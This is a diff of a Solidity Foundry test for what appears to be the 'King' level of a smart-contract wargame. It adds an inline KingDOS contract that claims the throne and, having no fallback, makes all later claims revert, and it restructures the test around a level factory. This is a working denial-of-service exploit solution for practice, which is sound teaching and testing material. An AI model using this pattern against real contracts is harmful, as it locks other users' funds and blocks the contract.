@@ -1,10 +1,20 @@
 // SPDX-License-Identifier: MIT
+
 pragma solidity ^0.6.0;
 
-import "tests/Test.sol";
-import "../../src/King/Level.sol";
-import "forge-std/console.sol";
-import "../utils/KingDOS.sol";
+contract KingDOS {
+    // no fallback ;)
+
+    function lockThrone(address king) external payable {
+        (bool success,) = king.call.value(msg.value)("");
+        assert(success);
+    }
+}
+
+pragma solidity ^0.6.0;
+
+import {LevelFactory} from "../utils/LevelFactory.sol";
+import {King} from "../../src/King/Level.sol";
 
 interface IKing {
     function _king() external view returns (address payable);
@@ -16,12 +26,9 @@ interface IKingDos {
     function lockThrone(address king) external payable;
 }
 
-contract KingTest is Test {
+contract KingTest is LevelFactory {
     IKing king;
     IKingDos kingDos;
-
-    address deployer = address(100);
-    address attacker = address(101);
 
     function setUp() public {
         vm.prank(deployer); // deploy the contract as deployer
@@ -31,21 +38,25 @@ contract KingTest is Test {
     }
 
     function testAttack() public {
-        /* Setup stuff, no need to touch */
-        vm.startPrank(attacker);
-        vm.deal(attacker, 5 ether);
+      submitLevel("King");
+    }
 
-        /* Write your code here */
+    function _performTest() internal override {
         kingDos.lockThrone.value(2 ether)(address(king));
         assert(address(king._king()) == address(kingDos));
-        /* Write your code here */ 
+    }
 
-        /* Validating the test */
+    function _setupTest() internal override {
+      super._setupTest();
+      vm.deal(attacker, 5 ether);
+    }
+
+    function _checkTest() internal override returns (bool) {
         vm.stopPrank();
         vm.prank(deployer);
-        (bool worked,) = address(king).call("");
-        assertFalse(worked);
+        (bool success,) = address(king).call("");
+        assertFalse(success);
+
+        return !success;
     }
 }
-
-
